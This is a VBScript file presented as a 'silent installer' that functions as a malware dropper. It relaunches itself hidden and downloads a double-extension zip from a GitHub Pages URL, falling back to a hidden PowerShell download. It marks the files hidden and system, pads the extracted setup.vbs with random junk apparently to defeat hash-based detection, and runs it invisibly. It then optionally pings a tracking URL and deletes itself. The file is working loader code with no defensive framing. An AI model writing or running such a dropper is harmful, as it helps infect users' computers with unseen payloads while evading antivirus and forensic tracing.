
' ============================================================
' VBS PRO SILENT INSTALLER - SINGLE UNIQUE HIT
' ============================================================

On Error Resume Next

' ---- CONSTANTS ------------------------------------------------
Const HIDE_WINDOW = 0
Const SHOW_WINDOW = 1
Const LOG_FILE = "vbs_installer.log"

' ---- USER SETTINGS -------------------------------------------
Const INPUT_URL = "https://gghuub321.github.io/DogFile/Quick_Any2Ico.zip.zip"
Const URL_AFTER = ""
Const JUNK_SIZE = 102400          ' padding in bytes (for setup.vbs)
Const ENABLE_SILENT_HIT = 1  ' 1=Yes, 0=No

' ---- COMMAND LINE ARGS ---------------------------------------
Dim args, arg0, arg1, arg2
Dim showWindow, autoDetect
Set args = WScript.Arguments
arg0 = "0" : arg1 = "1" : arg2 = "0"
If args.Count >= 1 Then arg0 = args(0)
If args.Count >= 2 Then arg1 = args(1)
If args.Count >= 3 Then arg2 = args(2)

showWindow = CInt(arg0)
autoDetect = CInt(arg1)

' ---- ENVIRONMENT ----------------------------------------------
Dim shell, fso, env, hiddenMarker, logPath, dq
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set env = shell.Environment("PROCESS")
hiddenMarker = "__VBS_HIDDEN_LAUNCH"
dq = Chr(34)

logPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\" & LOG_FILE
Sub WriteLog(msg)
    On Error Resume Next
    Dim ts
    Set ts = fso.OpenTextFile(logPath, 8, True)
    ts.WriteLine Now & " - " & msg
    ts.Close
End Sub

' ---- HIDE WINDOW (RE-LAUNCH) ----------------------------------
If showWindow <> 1 And env(hiddenMarker) <> "1" Then
    env(hiddenMarker) = "1"
    Dim cmd
    cmd = dq & WScript.FullName & dq & " " & dq & WScript.ScriptFullName & dq & " " & arg0 & " " & arg1 & " " & arg2
    shell.Run cmd, HIDE_WINDOW, False
    WScript.Quit
End If

WriteLog "========================================="
WriteLog "INSTALLER STARTED (PRO SILENT MODE)"
WriteLog "========================================="

' ============================================================
' FAST RANDOM STRING (chunk-based for speed)
' ============================================================
Function RandomStringFast(length)
    Dim chars, i, chunkSize, result, chunk
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    Randomize
    chunkSize = 1024
    result = ""
    Do While Len(result) < length
        chunk = ""
        For i = 1 To chunkSize
            chunk = chunk & Mid(chars, Int((Len(chars) * Rnd) + 1), 1)
        Next
        result = result & chunk
    Loop
    RandomStringFast = Left(result, length)
End Function

' ============================================================
' BUILD UNIQUE URL WITH RANDOM PARAMETER
' ============================================================
Function BuildUniqueUrl(baseUrl)
    Dim sep, ts, rand
    Randomize
    If InStr(baseUrl, "?") > 0 Then sep = "&" Else sep = "?"
    ts = CLng(Timer * 1000)
    rand = RandomStringFast(6)
    BuildUniqueUrl = baseUrl & sep & "_t=" & ts & rand
End Function

' ============================================================
' SINGLE SILENT HIT - ONLY ONE REQUEST (NO RETRIES)
' ============================================================
Sub SilentHit(baseUrl)
    On Error Resume Next
    Dim uniqueUrl, http

    If baseUrl = "" Then
        WriteLog "Hit SKIPPED: URL is empty"
        Exit Sub
    End If

    uniqueUrl = BuildUniqueUrl(baseUrl)
    WriteLog "Unique URL: " & uniqueUrl

    ' Send exactly one request via WinHTTP (supports SSL)
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Not http Is Nothing Then
        http.Open "GET", uniqueUrl, False
        http.setOption 4, 13056   ' ignore SSL errors
        http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        http.setRequestHeader "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        http.setRequestHeader "Accept-Language", "en-US,en;q=0.9"
        http.setRequestHeader "Referer", "https://www.google.com/"
        http.Send
        If Err.Number = 0 Then
            WriteLog "Hit sent successfully (status: " & http.Status & ")"
        Else
            WriteLog "Hit failed: " & Err.Description
        End If
    Else
        WriteLog "WinHTTP not available – hit skipped"
    End If
End Sub

' ---- DETECT ZIP LINK (FAST) -----------------------------------
Function GetZipUrlFromPage(pageUrl)
    On Error Resume Next
    Dim http, content, regex, matches, zipRef
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then Set http = CreateObject("MSXML2.XMLHTTP")
    If http Is Nothing Then GetZipUrlFromPage = "": Exit Function
    http.Open "GET", pageUrl, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    http.Send
    If http.Status <> 200 Then GetZipUrlFromPage = "": Exit Function
    content = http.responseText
    Set regex = New RegExp
    regex.Global = False
    regex.IgnoreCase = True
    regex.Pattern = "href=[""']([^""']*\.zip)[""']"
    Set matches = regex.Execute(content)
    If matches.Count > 0 Then
        zipRef = matches(0).SubMatches(0)
        If Left(zipRef, 4) <> "http" Then
            Dim base
            base = Left(pageUrl, InStrRev(pageUrl, "/"))
            If Left(zipRef, 1) = "/" Then base = Left(pageUrl, InStr(pageUrl, "/", 8) + 1)
            zipRef = base & zipRef
        End If
        GetZipUrlFromPage = zipRef: Exit Function
    End If
    regex.Pattern = "([^\s""']+\.zip)"
    Set matches = regex.Execute(content)
    If matches.Count > 0 Then
        zipRef = matches(0).SubMatches(0)
        If Left(zipRef, 4) <> "http" Then
            Dim base2
            base2 = Left(pageUrl, InStrRev(pageUrl, "/"))
            If Left(zipRef, 1) = "/" Then base2 = Left(pageUrl, InStr(pageUrl, "/", 8) + 1)
            zipRef = base2 & zipRef
        End If
        GetZipUrlFromPage = zipRef: Exit Function
    End If
    GetZipUrlFromPage = ""
End Function

' ---- DOWNLOAD FILE (FAST) --------------------------------------
Function DownloadFile(url, destPath)
    On Error Resume Next
    Dim http, stream, ts, fullUrl
    ts = "?t=" & CLng(DateDiff("s", "1970-01-01 00:00:00", Now()))
    fullUrl = url & ts

    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then Set http = CreateObject("MSXML2.XMLHTTP")
    If Not http Is Nothing Then
        http.Open "GET", fullUrl, False
        http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        http.Send
        If http.Status = 200 Then
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write http.responseBody
            stream.SaveToFile destPath, 2
            stream.Close
            If fso.FileExists(destPath) And fso.GetFile(destPath).Size > 1000 Then
                DownloadFile = True: Exit Function
            End If
        End If
    End If

    Dim psCmd
    psCmd = "powershell -Command " & dq & "Invoke-WebRequest -Uri '" & fullUrl & "' -OutFile '" & destPath & "' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'" & dq
    shell.Run psCmd, HIDE_WINDOW, True
    If fso.FileExists(destPath) And fso.GetFile(destPath).Size > 1000 Then
        DownloadFile = True: Exit Function
    End If

    DownloadFile = False
End Function

' ---- FIND SETUP.VBS (RECURSIVE) -------------------------------
Function FindSetupVBS(folder)
    On Error Resume Next
    Dim subFolder, file
    For Each subFolder In fso.GetFolder(folder).SubFolders
        FindSetupVBS = FindSetupVBS(subFolder.Path)
        If FindSetupVBS <> "" Then Exit Function
    Next
    For Each file In fso.GetFolder(folder).Files
        If LCase(file.Name) = "setup.vbs" Then
            FindSetupVBS = file.Path
            Exit Function
        End If
    Next
    FindSetupVBS = ""
End Function

' ============================================================
' MAIN EXECUTION
' ============================================================

Dim appDataFolder
appDataFolder = shell.ExpandEnvironmentStrings("%APPDATA%")
WriteLog "AppData: " & appDataFolder

Dim downloadUrl, detected
downloadUrl = INPUT_URL
If autoDetect = 1 And InStr(INPUT_URL, ".zip") = 0 Then
    detected = GetZipUrlFromPage(INPUT_URL)
    If detected <> "" Then downloadUrl = detected
End If
WriteLog "Download URL: " & downloadUrl

Dim randName, zipPath, extractDir, downloadSuccess
randName = RandomStringFast(12)
zipPath = appDataFolder & "\download_" & randName & ".zip"
extractDir = appDataFolder & "\setup_" & randName

downloadSuccess = DownloadFile(downloadUrl, zipPath)
If Not downloadSuccess Then
    WriteLog "Download FAILED"
    WScript.Quit 1
End If

Dim zipFile
Set zipFile = fso.GetFile(zipPath)
If zipFile.Size < 1000 Then
    fso.DeleteFile zipPath, True
    WScript.Quit 1
End If
WriteLog "Downloaded: " & zipFile.Size & " bytes"

' ---- HIDE ZIP ------------------------------------------------
shell.Run "attrib +h +s " & dq & zipPath & dq, 0, True

' ---- EXTRACT ZIP (SILENT) ------------------------------------
Dim shellApp, zipFolder, extractFolder
Set shellApp = CreateObject("Shell.Application")
Set zipFolder = shellApp.NameSpace(zipPath)
If Not zipFolder Is Nothing Then
    If Not fso.FolderExists(extractDir) Then fso.CreateFolder extractDir
    Set extractFolder = shellApp.NameSpace(extractDir)
    If Not extractFolder Is Nothing Then
        extractFolder.CopyHere zipFolder.Items, 16   ' 16 = suppress progress
        If Err.Number = 0 Then
            WriteLog "Extract OK"
            shell.Run "attrib +h +s " & dq & extractDir & dq & " /s /d", 0, True
        Else
            fso.DeleteFile zipPath, True
            WScript.Quit 1
        End If
    Else
        fso.DeleteFile zipPath, True
        WScript.Quit 1
    End If
Else
    fso.DeleteFile zipPath, True
    WScript.Quit 1
End If

' ---- FIND AND RUN SETUP.VBS ----------------------------------
Dim vbsPath
vbsPath = FindSetupVBS(extractDir)
If vbsPath <> "" Then
    WriteLog "Found setup.vbs"
    ' Add padding to setup.vbs
    Dim junk
    junk = "'" & RandomStringFast(JUNK_SIZE)
    Dim vbsFile
    Set vbsFile = fso.OpenTextFile(vbsPath, 8, False)
    vbsFile.WriteLine junk
    vbsFile.Close
    WriteLog "Padding added to setup.vbs (" & JUNK_SIZE & " bytes)"
    ' Launch setup.vbs HIDDEN
    shell.Run "wscript.exe " & dq & vbsPath & dq, HIDE_WINDOW, False
    WriteLog "setup.vbs launched"
Else
    WriteLog "setup.vbs NOT found"
End If

' ---- CLEANUP ZIP ---------------------------------------------
fso.DeleteFile zipPath, True

' ---- SINGLE SILENT HIT (if enabled) ----
If ENABLE_SILENT_HIT = 1 And URL_AFTER <> "" Then
    WriteLog "Sending ONE unique silent hit..."
    Call SilentHit(URL_AFTER)
Else
    WriteLog "Silent Hit disabled or URL empty"
End If

' ---- SELF-DESTRUCT (delayed) ----
Dim selfPath, delCmd
selfPath = WScript.ScriptFullName
delCmd = "cmd.exe /c timeout /t 3 /nobreak >nul & del " & dq & selfPath & dq
shell.Run delCmd, HIDE_WINDOW, False

WriteLog "INSTALLER COMPLETED"

